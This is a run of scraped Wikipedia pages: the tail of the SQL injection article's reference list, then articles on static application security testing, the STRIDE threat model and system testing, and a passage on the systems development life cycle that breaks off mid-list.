 (2): 188–197. 
doi
:
10.1049/sfw2.12018
. 
ISSN
 
1751-8806
. 
S2CID
 
233582569
.




^
 
"Hacking NodeJS and MongoDB | Websecurify Blog"
. Retrieved 
November 15,
 2023
.




^
 
Imperva (July 2012). 
"Imperva Web Application Attack Report"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on September 7, 2013
. Retrieved 
August 4,
 2013
. 
Retailers suffer 2x as many SQL injection attacks as other industries. / While most web applications receive 4 or more web attack campaigns per month, some websites are constantly under attack. / One observed website was under attack 176 out of 180 days, or 98% of the time.




^
 
Jeff Forristal (signing as rain.forest.puppy) (December 25, 1998). 
"NT Web Technology Vulnerabilities"
. 
Phrack Magazine
. 
8
 (54 (article 8)). 
Archived
 from the original on March 19, 2014.




^
 
"Category:OWASP Top Ten Project"
. OWASP. 
Archived
 from the original on May 19, 2011
. Retrieved 
June 3,
 2011
.




^
 
"Category:OWASP Top Ten Project"
. OWASP. 
Archived
 from the original on October 9, 2013
. Retrieved 
August 13,
 2013
.




^
 
"How to Enter SQL Comments"
 
(PDF)
, 
IBM Informix Guide to SQL: Syntax
, IBM, pp. 13–14, archived from 
the original
 
(PDF)
 on February 24, 2021
, retrieved 
June 4,
 2018




^
 
"Extracting Multiple Bits Per Request From Full-blind SQL Injection Vulnerabilities"
. Hack All The Things. Archived from 
the original
 on July 8, 2016
. Retrieved 
July 8,
 2016
.




^
 
"Using SQLBrute to brute force data from a blind SQL injection point"
. Justin Clarke. Archived from 
the original
 on June 14, 2008
. Retrieved 
October 18,
 2008
.




^
 
macd3v. 
"Blind SQL Injection tutorial"
. Archived from 
the original
 on December 14, 2012
. Retrieved 
December 6,
 2012
.
{{
cite web
}}
:  CS1 maint: numeric names: authors list (
link
)




^
 
Andrey Rassokhin; Dmitry Oleksyuk. 
"TDSS botnet: full disclosure"
. Archived from 
the original
 on December 9, 2012
. Retrieved 
December 6,
 2012
.




^
 
"Questions for TalkTalk - BBC News"
. 
BBC News
. October 26, 2015. 
Archived
 from the original on October 26, 2015
. Retrieved 
October 26,
 2015
.




^
 
"Transparent query layer for MySQL"
. Robert Eisele. November 8, 2010.




^
 
"SQL Injection Attacks & Prevention: Complete Guide"
. 
appsecmonkey.com
. February 13, 2021
. Retrieved 
February 24,
 2021
.




^
 
"SQL Injection Prevention Cheat Sheet"
. Open Web Application Security Project. 
Archived
 from the original on January 20, 2012
. Retrieved 
March 3,
 2012
.




^
 
"Guesswork Plagues Web Hole Reporting"
. 
SecurityFocus
. March 6, 2002. Archived from 
the original
 on July 9, 2012.




^
 
"WHID 2005-46: Teen uses SQL injection to break to a security magazine web site"
. Web Application Security Consortium. November 1, 2005. Archived from 
the original
 on January 17, 2010
. Retrieved 
December 1,
 2009
.




^
 
"WHID 2006-3: Russian hackers broke into a RI GOV website"
. Web Application Security Consortium. January 13, 2006. Archived from 
the original
 on February 13, 2011
. Retrieved 
May 16,
 2008
.




^
 
"Anti-U.S. Hackers Infiltrate Army Servers"
. 
Information Week
. May 29, 2009. 
Archived
 from the original on December 20, 2016
. Retrieved 
December 17,
 2016
.




^
 
Alex Papadimoulis (April 15, 2008). 
"Oklahoma Leaks Tens of Thousands of Social Security Numbers, Other Sensitive Data"
. 
The Daily WTF
. 
Archived
 from the original on May 10, 2008
. Retrieved 
May 16,
 2008
.




^
 
"US man 'stole 130m card numbers'
"
. BBC. August 17, 2009. 
Archived
 from the original on August 18, 2009
. Retrieved 
August 17,
 2009
.




^
 
"The pirate bay attack"
. July 7, 2010. 
Archived
 from the original on August 24, 2010.




^
 
"Did Little Bobby Tables migrate to Sweden?"
. Alicebobandmallory.com. 
Archived
 from the original on July 1, 2012
. Retrieved 
June 3,
 2011
.




^
 
"Royal Navy website attacked by Romanian hacker"
. BBC News. November 8, 2010. 
Archived
 from the original on November 9, 2010
. Retrieved 
November 15,
 2023
.




^
 
Sam Kiley (November 25, 2010). 
"Super Virus A Target For Cyber Terrorists"
. Archived from 
the original
 on November 28, 2010
. Retrieved 
November 25,
 2010
.




^
 
"Hacker breaks into Barracuda Networks database"
. Archived from 
the original
 on July 27, 2011.




^
 
"site user password intrusion info"
. Dslreports.com. 
Archived
 from the original on October 18, 2012
. Retrieved 
June 3,
 2011
.




^
 
"DSLReports says member information stolen"
. Cnet News. April 28, 2011. Archived from 
the original
 on March 21, 2012
. Retrieved 
April 29,
 2011
.




^
 
"DSLReports.com breach exposed more than 100,000 accounts"
. The Tech Herald. April 29, 2011. Archived from 
the original
 on April 30, 2011
. Retrieved 
April 29,
 2011
.




^
 
"LulzSec hacks Sony Pictures, reveals 1m passwords unguarded"
, 
electronista.com
, June 2, 2011, archived from 
the original
 on June 6, 2011
, retrieved 
June 3,
 2011




^
 
"Imperva.com: PBS Hacked - How Hackers Probably Did It"
. Archived from 
the original
 on June 29, 2011
. Retrieved 
July 1,
 2011
.




^
 
Ngak, Chenda. 
"Yahoo reportedly hacked: Is your account safe?"
. 
CBS News
. 
Archived
 from the original on July 14, 2012
. Retrieved 
July 16,
 2012
.




^
 
Yap, Jamie (July 12, 2012). 
"450,000 user passwords leaked in Yahoo breach"
. 
ZDNet
. 
Archived
 from the original on July 2, 2014
. Retrieved 
February 18,
 2017
.




^
 
Perlroth, Nicole (October 3, 2012). 
"Hackers Breach 53 Universities and Dump Thousands of Personal Records Online"
. 
New York Times
. 
Archived
 from the original on October 5, 2012.




^
 
Kovacs, Eduard (November 4, 2013). 
"Hackers Leak Data Allegedly Stolen from Chinese Chamber of Commerce Website"
. 
Softpedia News
. 
Archived
 from the original on March 2, 2014
. Retrieved 
February 27,
 2014
.




^
 
Damon Poeter. 
'Close-Knit' Russian Hacker Gang Hoards 1.2 Billion ID Creds
 
Archived
 July 14, 2017, at the 
Wayback Machine
, 
PC Magazine
, August 5, 2014




^
 
Nicole Perlroth. 
Russian Gang Amasses Over a Billion Internet Passwords
 
Archived
 February 27, 2017, at the 
Wayback Machine
, 
The New York Times
, August 5, 2014.




^
 
"TalkTalk gets record £400,000 fine for failing to prevent October 2015 attack"
. October 5, 2016. Archived from 
the original
 on October 24, 2016
. Retrieved 
October 23,
 2016
.




^
 
Goodin, Dan (March 2, 2021). 
"Rookie coding mistake prior to Gab hack came from site's CTO"
. 
Ars Technica
.




^
 
Goodin, Dan (March 8, 2021). 
"Gab, a haven for pro-Trump conspiracy theories, has been hacked again"
. 
Ars Technica
.




^
 
Munroe, Randall. 
"XKCD: Exploits of a Mom"
. 
Archived
 from the original on February 25, 2013
. Retrieved 
February 26,
 2013
.




^
 
"The Bobby Tables Guide to SQL Injection"
. September 15, 2009. Archived from 
the original
 on November 7, 2017
. Retrieved 
October 30,
 2017
.




^
 
"Jego firma ma w nazwie SQL injection. Nie zazdrościmy tym, którzy będą go fakturowali ;)"
. 
Niebezpiecznik
 (in Polish). September 11, 2014. 
Archived
 from the original on September 24, 2014
. Retrieved 
September 26,
 2014
.






External links
[
edit
]


OWASP SQL Injection Cheat Sheets
, by OWASP.


WASC Threat Classification - SQL Injection Entry
, by the Web Application Security Consortium.


Why SQL Injection Won't Go Away
 
Archived
 November 9, 2012, at the 
Wayback Machine
, by Stuart Thomas.


SDL Quick security references on SQL injection
 by Bala Neerumalla.


How security flaws work: SQL injection


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=SQL_injection&oldid=1246169790
"


Categories
: 
Injection exploits
SQL
Hidden categories: 
CS1 maint: numeric names: authors list
Webarchive template wayback links
CS1 Polish-language sources (pl)
Articles with short description
Short description is different from Wikidata
Use mdy dates from February 2012
Articles with example SQL code











From Wikipedia, the free encyclopedia






Software securing application


Static application security testing
 (
SAST
) is used to secure software by reviewing the source code of the software to identify sources of vulnerabilities. Although the process of 
statically analyzing the source code
 has existed as long as computers have existed, the technique spread to security in the late 90s and the first public discussion of 
SQL injection
 in 1998 when Web applications integrated new technologies like 
JavaScript
 and 
Flash
.

Unlike 
dynamic application security testing
 (DAST) tools for 
black-box testing
 of application functionality, SAST tools focus on the code content of the application, 
white-box testing
.
A SAST tool scans the source code of applications and its components to identify potential security vulnerabilities in their software and architecture.
Static analysis tools can detect an estimated 50% of existing security vulnerabilities.
[
1
]


In the 
software development life cycle
 (SDLC), SAST is performed early in the development process and at code level, and also when all pieces of code and components are put together in a consistent testing environment. SAST is also used for software quality assurance,
[
2
]
 even if the many resulting 
false-positive
 impede its adoption by developers
[
3
]


SAST tools are integrated into the development process to help development teams as they are primarily focusing on developing and delivering software respecting requested specifications.
[
4
]
 
SAST tools, like other security tools, focus on reducing the risk of downtime of applications or that private information stored in applications will not be compromised.

For the year of 2018, the Privacy Rights Clearinghouse database
[
5
]
 shows that more than 612 million records have been compromised by hacking.





Overview
[
edit
]


Application security tests of applications their release: static application security testing (SAST), 
dynamic application security testing
 (DAST), and interactive application security testing (IAST), a combination of the two.
[
6
]


Static analysis tools examine the text of a program syntactically. They look for a fixed set of patterns or rules in the source code. Theoretically, they can also examine a compiled form of the software. This technique relies on 
instrumentation
 of the code to do the mapping between compiled components and source code components to identify issues.
Static analysis can be done manually as a 
code review
 or 
auditing
 of the code for different purposes, including security, but it is time-consuming.
[
7
]


The precision of SAST tool is determined by its scope of analysis and the specific techniques used to identify vulnerabilities. Different levels of analysis include:



function level
 - sequences of instruction.


file or class-level
 - an extensible program-code-template for object creation.


application level
 - a program or group of programs that interact.


The scope of the analysis determines its accuracy and capacity to detect vulnerabilities using contextual information.
[
8
]
 SAST tools unlike 
DAST
 gives the developers real-time feedback, and help them secure flaws before they the code to the next level. 

At a function level, a common technique is the construction of an 
Abstract syntax tree
 to control the flow of data within the function.
[
9
]


Since late 90s, the need to adapt to business challenges has transformed software development with componentization
[
10
]
 enforced by processes and organization of development teams.
[
11
]

Following the flow of data between all the components of an application or group of applications allows validation of required calls to dedicated procedures for 
sanitization
 and that proper actions are taken to taint data in specific pieces of code.
[
12
]
[
13
]


The rise of web applications entailed testing them: Verizon Data Breach reports in 2016 that 40% of all data breaches use web application vulnerabilities.
[
14
]
 
As well as external security validations, there is a rise in focus on internal threats. The Clearswift Insider Threat Index (CITI) has reported that 92% of their respondents in a 2015 survey said they had experienced IT or security incidents in the previous 12 months and that 74% of these breaches were originated by insiders.
[
15
]
[
16
]
 Lee Hadlington categorized internal threats in 3 categories: malicious, accidental, and unintentional. Mobile applications' explosive growth implies securing applications earlier in the development process to reduce malicious code development.
[
17
]




SAST strengths
[
edit
]


The earlier a vulnerability is fixed in the SDLC, the cheaper it is to fix. Costs to fix in development are 10 times lower than in testing, and 100 times lower than in production.
[
18
]

SAST tools run automatically, either at the code level or application-level and do not require interaction. When integrated into a CI/CD context, SAST tools can be used to automatically stop the integration process if critical vulnerabilities are identified.
[
19
]


Because the tool scans the entire source-code, it can cover 100% of it, while 
dynamic application security testing
 covers its execution possibly missing part of the application,
[
6
]
 or unsecured configuration in configuration files.

SAST tools can offer extended functionalities such as quality and architectural testing. There is a direct correlation between the quality and the security. Bad quality software is also poorly secured software.

[
20
]




SAST weaknesses
[
edit
]


Even though developers are positive about the usage of SAST tools, there are different challenges to the adoption of SAST tools by developers.
[
4
]
 The usability of the output generated by these tools may challenge how much developers can make use of these tools. Research shows that despite the long out generated by these tools, they may lack usability.
[
21
]


With Agile Processes in software development, early integration of SAST generates many bugs, as developers using this framework focus first on features and delivery.
[
22
]


Scanning many lines of code with SAST tools may result in hundreds or thousands of vulnerability warnings for a single application. It can generate many false-positives, increasing investigation time and reducing trust in such tools. This is particularly the case when the context of the vulnerability cannot be caught by the tool.
[
3
]




See also
[
edit
]


Security testing


Lint (software)


Dynamic application security testing


Interactive application security testing


Static program analysis


References
[
edit
]






^
 


Okun, V.; Guthrie, W. F.; Gaucher, H.; Black, P. E. (October 2007). 
"Effect of static analysis tools on software security: preliminary investigation"
 
(PDF)
. 
Proceedings of the 2007 ACM Workshop on Quality of Protection
. ACM: 1–5. 
doi
:
10.1145/1314257.1314260
. 
S2CID
 
6663970
.




^
 


Ayewah, N.; Hovemeyer, D.; Morgenthaler, J.D.; Penix, J.; Pugh, W. (September 2008). "Using static analysis to find bugs". 
IEEE Software
. 
25
 (5). IEEE: 22–29. 
doi
:
10.1109/MS.2008.130
. 
S2CID
 
20646690
.




^ 
a
 
b
 
Johnson, Brittany; Song, Yooki; Murphy-Hill, Emerson; Bowdidge, Robert (May 2013). "Why don't software developers use static analysis tools to find bug". 
ICSE '13 Proceedings of the 2013 International Conference on Software Engineering
: 672–681. 
ISBN
 
978-1-4673-3076-3
.




^ 
a
 
b
 


Oyetoyan, Tosin Daniel; Milosheska, Bisera; Grini, Mari (May 2018). "Myths and Facts About Static Application Security Testing Tools: An Action Research at Telenor Digital". 
International Conference on Agile Software Development
. Springer: 86–103.




^
 
"Data Breaches | Privacy Rights Clearinghouse"
. 
privacyrights.org
.




^ 
a
 
b
 


Parizi, R. M.; Qian, K.; Shahriar, H.; Wu, F.; Tao, L. (July 2018). "Benchmark Requirements for Assessing Software Security Vulnerability Testing Tools". 
2018 IEEE 42nd Annual Computer Software and Applications Conference (COMPSAC)
. IEEE. pp. 825–826. 
doi
:
10.1109/COMPSAC.2018.00139
. 
ISBN
 
978-1-5386-2666-5
. 
S2CID
 
52055661
.




^
 


Chess, B.; McGraw, G. (December 2004). "Static analysis for security". 
IEEE Security & Privacy
. 
2
 (6). IEEE: 76–79. 
doi
:
10.1109/MSP.2004.111
.




^
 


Chess, B.; McGraw, G. (October 2004). 
"Risk Analysis in Software Design"
. 
IEEE Security & Privacy
. 
2
 (4). IEEE: 76–84. 
doi
:
10.1109/MSP.2004.55
.




^
 


Yamaguchi, Fabian; Lottmann, Markus; Rieck, Konrad (December 2012). "Generalized vulnerability extrapolation using abstract syntax trees". 
Proceedings of the 28th Annual Computer Security Applications Conference
. Vol. 2. IEEE. pp. 359–368. 
doi
:
10.1145/2420950.2421003
. 
ISBN
 
9781450313124
. 
S2CID
 
8970125
.




^
 


Booch, Grady; Kozaczynski, Wojtek (September 1998). "Component-Based Software Engineering". 
IEEE Software
. 
15
 (5): 34–36. 
doi
:
10.1109/MS.1998.714621
. 
S2CID
 
33646593
.




^
 


Mezo, Peter; Jain, Radhika (December 2006). "Agile Software Development: Adaptive Systems Principles and Best Practices". 
Information Systems Management
. 
23
 (3): 19–30. 
doi
:
10.1201/1078.10580530/46108.23.3.20060601/93704.3
. 
S2CID
 
5087532
.




^
 


Livshits, V.B.; Lam, M.S. (May 2006). "Finding Security Vulnerabilities in Java Applications with Static Analysis". 
USENIX Security Symposium
. 
14
: 18.




^
 


Jovanovic, N.; Kruegel, C.; Kirda, E. (May 2006). "Pixy: A static analysis tool for detecting Web application vulnerabilities". 
2006 IEEE Symposium on Security and Privacy (S&P'06)
. IEEE. pp. 359–368. 
doi
:
10.1109/SP.2006.29
. 
ISBN
 
0-7695-2574-1
. 
S2CID
 
1042585
.




^
 
"2016 Data Breach Investigations Report"
 
(PDF)
. 
Verizon
. 2016
. Retrieved 
8 January
 2016
.




^
 
"Clearswift report: 40 percent of firms expect a data breach in the Next Year"
. Endeavor Business Media. 20 November 2015
. Retrieved 
8 January
 2024
.




^
 
"The Ticking Time Bomb: 40% of Firms Expect an Insider Data Breach in the Next 12 Months"
. Fortra. 18 November 2015
. Retrieved 
8 January
 2024
.




^
 


Xianyong, Meng; Qian, Kai; Lo, Dan; Bhattacharya, Prabir; Wu, Fan (June 2018). "Secure Mobile Software Development with Vulnerability Detectors in Static Code Analysis". 
2018 International Symposium on Networks, Computers and Communications (ISNCC)
. pp. 1–4. 
doi
:
10.1109/ISNCC.2018.8531071
. 
ISBN
 
978-1-5386-3779-1
. 
S2CID
 
53288239
.




^
 


Hossain, Shahadat (October 2018). 
"Rework and Reuse Effects in Software Economy"
. 
Global Journal of Computer Science and Technology
. 
18
 (C4): 35–50.




^
 


Okun, V.; Guthrie, W. F.; Gaucher, H.; Black, P. E. (October 2007). 
"Effect of static analysis tools on software security: preliminary investigation"
 
(PDF)
. 
Proceedings of the 2007 ACM Workshop on Quality of Protection
. ACM: 1–5. 
doi
:
10.1145/1314257.1314260
. 
S2CID
 
6663970
.




^
 


Siavvas, M.; Tsoukalas, D.; Janković, M.; Kehagias, D.; Chatzigeorgiou, A.; Tzovaras, D.; Aničić, N.; Gelenbe, E. (August 2019). "An Empirical Evaluation of the Relationship between Technical Debt and Software Security". In Konjović, Z.; Zdravković, M.; Trajanović, M. (eds.). 
International Conference on Information Society and Technology 2019 Proceedings
 (Data set). Vol. 1. pp. 199–203. 
doi
:
10.5281/zenodo.3374712
.




^
 
Tahaei, Mohammad; Vaniea, Kami; Beznosov, Konstantin (Kosta); Wolters, Maria K (6 May 2021). 
Security Notifications in Static Analysis Tools: Developers' Attitudes, Comprehension, and Ability to Act on Them
. pp. 1–17. 
doi
:
10.1145/3411764.3445616
. 
ISBN
 
9781450380966
. 
S2CID
 
233987670
.




^
 


Arreaza, Gustavo Jose Nieves (June 2019). "Methodology for Developing Secure Apps in the Clouds. (MDSAC) for IEEECS Confererences". 
2019 6th IEEE International Conference on Cyber Security and Cloud Computing (CSCloud)/ 2019 5th IEEE International Conference on Edge Computing and Scalable Cloud (EdgeCom)
. IEEE. pp. 102–106. 
doi
:
10.1109/CSCloud/EdgeCom.2019.00-11
. 
ISBN
 
978-1-7281-1661-7
. 
S2CID
 
203655645
.














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Static_application_security_testing&oldid=1213839405
"


Categories
: 
Security testing
Static program analysis
Hidden categories: 
Articles with short description
Short description matches Wikidata











From Wikipedia, the free encyclopedia




(Redirected from 
STRIDE (security)
)


Model for identifying computer security threats


STRIDE
 is a model for identifying 
computer security
 
threats
[
1
]
 developed by Praerit Garg and 
Loren Kohnfelder
 at 
Microsoft
.
[
2
]
   It provides a 
mnemonic
 for security threats in six categories.
[
3
]


The threats are:



S
poofing


T
ampering


R
epudiation


I
nformation disclosure (
privacy breach
 or 
data leak
)


D
enial of service


E
levation of privilege
[
4
]


The STRIDE was initially created as part of the process of 
threat modeling
.  STRIDE is a model of threats, used to help reason and find threats to a system.  It is used in conjunction with a model of the target system that can be constructed in parallel.  This includes a full breakdown of processes, data stores, data flows, and trust boundaries.
[
5
]


Today it is often used by security experts to help answer the question "what can go wrong in this system we're working on?"

Each threat is a violation of a desirable property for a system:







Threat


Desired property


Threat Definition





Spoofing


Authenticity


Pretending to be something or someone other than yourself





Tampering


Integrity


Modifying something on disk, network, memory, or elsewhere





Repudiation


Non-repudiability


Claiming that you didn't do something or were not responsible; can be honest or false





Information disclosure


Confidentiality


Someone obtaining information they are not authorized to access





Denial of service


Availability


Exhausting resources needed to provide service





Elevation of privilege


Authorization


Allowing someone to do something they are not authorized to do





Notes on the threats
[
edit
]


Repudiation is unusual because it's a threat when viewed from a security perspective, and a desirable property of some privacy systems, for example, Goldberg's "
Off the Record
" messaging system.  This is a useful demonstration of the tension that security design analysis must sometimes grapple with.

Elevation of privilege is often called escalation of privilege, or privilege escalation.  They are synonymous.



See also
[
edit
]


Attack tree
 – another approach to security threat modeling, stemming from dependency analysis


Cyber security and countermeasure


DREAD
 – a classification system for security threats


OWASP
 – an organization devoted to improving web application security through education


CIA
 also known as AIC
[
6
]
[
7
]
 – another mnemonic for a security model to build security in IT systems


References
[
edit
]






^
 
Kohnfelder, Loren; Garg, Praerit (April 1, 1999). 
"The threats to our products"
. 
Microsoft Interface
. Retrieved 
13 April
 2021
.




^
 
Shostack, Adam (27 August 2009). 
"
"The Threats To Our Products"
"
. 
Microsoft SDL Blog
. Microsoft
. Retrieved 
18 August
 2018
.




^
 
"The STRIDE Threat Model"
. 
Microsoft
. Microsoft.




^
 
Guzman, Aaron; Gupta, Aditya (2017). 
IoT Penetration Testing Cookbook: Identify Vulnerabilities and Secure your Smart Devices
. Packt Publishing. pp. 34–35. 
ISBN
 
978-1-78728-517-0
.




^
 
Shostack, Adam (2014). 
Threat Modeling: Designing for Security
. Wiley. pp. 61–64. 
ISBN
 
978-1118809990
.




^
 
"Key OT Cybersecurity Challenges: Availability, Integrity and Confidentiality"
. 
tripwire.com
. Retrieved 
2022-07-20
.




^
 
"What is the CIA Triad? Definition, Explanation and Examples"
. 
WhatIs.com
. Retrieved 
2022-05-01
.






External links
[
edit
]


Uncover Security Design Flaws Using The STRIDE Approach


This 
computer science
 article is a 
stub
. You can help Wikipedia by 
expanding it
.
v
t
e










Retrieved from "
https://en.wikipedia.org/w/index.php?title=STRIDE_model&oldid=1220886525
"


Categories
: 
Computer security
Computer science stubs
Hidden categories: 
Articles with short description
Short description is different from Wikidata
All stub articles











From Wikipedia, the free encyclopedia






Testing conducted on a complete software system


See also: 
System integration testing


This article has multiple issues.
 Please help 
improve it
 or discuss these issues on the 
talk page
. 
(
Learn how and when to remove these messages
)




This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"System testing"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
January 2013
)
 (
Learn how and when to remove this message
)


This article 
may be 
unbalanced
 toward certain viewpoints
.
 Please 
improve the article
 by adding information on neglected viewpoints, or discuss the issue on the 
talk page
.
 
(
October 2018
)




 (
Learn how and when to remove this message
)


System testing
, a.k.a. 
end-to-end (E2E) testing
, is testing conducted on a complete 
software system
.

System testing describes testing as at the system level to contrast to testing at the 
integration
 or 
unit
 level.

System testing often serves the purpose of evaluating the system's compliance with its specified 
requirements
 
[
citation needed
]
 – often from a 
functional requirement specification
 (FRS), a 
system requirement specification
 (SRS), another type of specification or multiple. 

System testing can detect defects in the system as a whole.
[
citation needed
]
 
[
1
]


System testing can verify the design, the behavior and even the believed expectations of the customer. It is also intended to test up to and beyond the bounds of specified software and hardware requirements.
[
citation needed
]






Approaches
[
edit
]


Destructive testing
: tests are carried out to the specimen's failure, in order to understand a specimen's performance or material behaviour under different loads.


Nondestructive testing
: analysis techniques to evaluate the properties of a material, component or system without causing damage.


Fault injection
: A testing technique which stress the system in an unusual way to examine the system behavior.
[
2
]
[
3
]
[
4
]


See also
[
edit
]


Automated testing


Automatic test equipment


Mobile-device testing


Quality control


Software testing


Test case


Test fixture


Test plan


Notes
[
edit
]






^
 
"ISTQB Standard glossary of terms used in Software Testing"
.




^
 
Moradi, Mehrdad; Van Acker, Bert; Vanherpen, Ken; Denil, Joachim (2019). Chamberlain, Roger; Taha, Walid; Törngren, Martin (eds.). 
"Model-Implemented Hybrid Fault Injection for Simulink (Tool Demonstrations)"
. 
Cyber Physical Systems. Model-Based Design
. Lecture Notes in Computer Science. 
11615
. Cham: Springer International Publishing: 71–90. 
doi
:
10.1007/978-3-030-23703-5_4
. 
ISBN
 
978-3-030-23703-5
. 
S2CID
 
195769468
.




^
 
"Optimizing fault injection in FMI co-simulation through sensitivity partitioning | Proceedings of the 2019 Summer Simulation Conference"
. 
dl.acm.org
: 1–12. 22 July 2019
. Retrieved 
2020-06-15
.




^
 
Moradi, Mehrdad, Bentley James Oakes, Mustafa Saraoglu, Andrey Morozov, Klaus Janschek, and Joachim Denil. "Exploring Fault Parameter Space Using Reinforcement Learning-based Fault Injection." (2020).






References
[
edit
]


Black, Rex (2002). 
Managing the Testing Process
 (2nd ed.). Wiley Publishing. 
ISBN
 
0-471-22398-0
.


v
t
e
Software testing
The "box" approach


Black-box testing


All-pairs testing


Exploratory testing


Fuzz testing


Model-based testing


Scenario testing


Grey-box testing


White-box testing


API testing


Mutation testing


Static testing


Testing levels


Acceptance testing


Integration testing


System testing


Unit testing


Testing types, techniques,
and 
tactics


A/B testing


Benchmark


Compatibility testing


Concolic testing


Concurrent testing


Conformance testing


Continuous testing


Destructive testing


Development testing


Differential testing


Dynamic program analysis


Installation testing


Negative testing


Random testing


Regression testing


Security testing


Smoke testing (software)


Software performance testing


Stress testing


Symbolic execution


Test automation


Usability testing


See also


Graphical user interface testing


Manual testing


Orthogonal array testing


Pair testing


Soak testing


Software reliability testing


Stress testing


Web testing












Retrieved from "
https://en.wikipedia.org/w/index.php?title=System_testing&oldid=1226613569
"


Categories
: 
Software testing
Hardware testing
Systems engineering
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles needing additional references from January 2013
All articles needing additional references
Articles needing more viewpoints from October 2018
Articles with multiple maintenance issues
All articles with unsourced statements
Articles with unsourced statements from April 2008











From Wikipedia, the free encyclopedia






Systems engineering terms






Model of the software development life cycle, highlighting the maintenance phase


In 
systems engineering
, 
information systems
 and 
software engineering
, the 
systems development life cycle
 (
SDLC
), also referred to as the 
application development life cycle
, is a process for planning, creating, testing, and deploying an 
information system
.
[
1
]
 The SDLC concept applies to a range of hardware and software configurations, as a system can be composed of hardware only, software only, or a combination of both.
[
2
]
 There are usually six stages in this cycle: requirement analysis, design, development and testing, implementation, documentation, and evaluation.





Overview
[
edit
]


A systems development life cycle is composed of distinct work phases that are used by systems engineers and systems developers to deliver 
information systems
. Like anything that is manufactured on an assembly line, an SDLC aims to produce high-quality systems that meet or exceed expectations, based on requirements, by delivering systems within scheduled time frames and cost estimates.
[
3
]
 Computer systems are complex and often link components with varying origins. Various SDLC methodologies have been created, such as 
waterfall
, 
spiral
, 
agile
, 
rapid prototyping
, 
incremental
, and synchronize and stabilize.
[
4
]


SDLC methodologies fit within a flexibility spectrum ranging from agile to iterative to sequential. Agile methodologies, such as 
XP
 and 
Scrum
, focus on lightweight processes that allow for rapid changes.
[
5
]
 
Iterative
 methodologies, such as 
Rational Unified Process
 and 
dynamic systems development method
, focus on stabilizing project scope and iteratively expanding or improving products. Sequential or big-design-up-front (BDUF) models, such as waterfall, focus on complete and correct planning to guide larger projects and limit risks to successful and predictable results.
[
6
]
 
Anamorphic development
 is guided by project scope and adaptive iterations.

In 
project management
 a project can include both a 
project life cycle
 (PLC) and an SDLC, during which somewhat different activities occur. According to Taylor (2004), "the project life cycle encompasses all the activities of the 
project
, while the systems development life cycle focuses on realizing the product 
requirements
".
[
7
]


SDLC is not a methodology per se, but rather a description of the phases that a methodology should address. The list of phases is not definitive, but typically includes planning, analysis, design, build, test, implement, and maintenance/support. In the Scrum framework,
[
8
]
 for example, one could say a single user story goes through all the phases of the SDLC within a two-week sprint. By contrast the waterfall methodology, where every business requirement
[
citation needed
]
 is translated into feature/functional descriptions which are then all implemented typically over a period of months or longer.
[
citation needed
]




History
[
edit
]


According to Elliott (2004), SDLC "originated in the 1960s, to develop large scale functional 
business systems
 in an age of large scale 
business conglomerates
. Information systems activities revolved around heavy 
data processing
 and 
number crunching
 routines".
[
9
]


The 
structured systems analysis and design method
 (SSADM) was produced for the UK government 
Office of Government Commerce
 in the 1980s. Ever since, according to Elliott (2004), "the traditional life cycle approaches to systems development have been increasingly replaced with alternative approaches and frameworks, which attempted to overcome some of the inherent deficiencies of the traditional SDLC".
[
9
]




Models
[
edit
]


A ten-phase version of the systems development life cycle
[
10
]
This section 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
 in this section. Unsourced material may be challenged and removed.
 
(
January 2024
)
 (
Learn how and when to remove this message
)


SDLC provides a set of phases/steps/activities for system designers and developers to follow. Each phase builds on the results of the previous one.
[
10
]
[
11
]
[
12
]
[
13
]
 Not every project requires that the phases be sequential. For smaller, simpler projects, phases may be combined/overlap.
[
10
]




Waterfall
[
edit
]


The oldest and best known is the 
waterfall model
, which uses a linear sequence of steps.
[
11
]
 Waterfall has different varieties. One variety is as follows:
[
10
]
[
11
]
[
14
]
[
15
]




Preliminary analysis
[
edit
]


Conduct with a preliminary analysis, consider alternative solutions, estimate costs and benefits, and submit a preliminary plan with recommendations.



Conduct preliminary analysis: Identify the organization's objectives and define the nature and scope of the project. Ensure that the project fits with the objectives.


Consider alternative solutions: Alternatives may come from interviewing employees, clients, suppliers, and consultants, as well as competitive analysis.


Cost-benefit analysis: Analyze the costs and benefits of the project.


Systems analysis, requirements definition
[
edit
]


Decompose project goals
[
clarification needed
]
 into defined functions and operations. This involves gathering and interpreting facts, diagnosing problems, and recommending changes. Analyze end-user information needs and resolve inconsistencies and incompleteness:
[
16
]




Collect facts: Obtain end-user requirements by document review, client interviews, observation, and questionnaires.


Scrutinize existing system(s): Identify pros and cons.


Analyze the proposed system: Find solutions to issues and prepare specifications, incorporating appropriate user proposals.


Systems design
[
edit
]


At this step, desired features and operations are detailed, including screen layouts, 
business rules
, 
process diagrams
, 
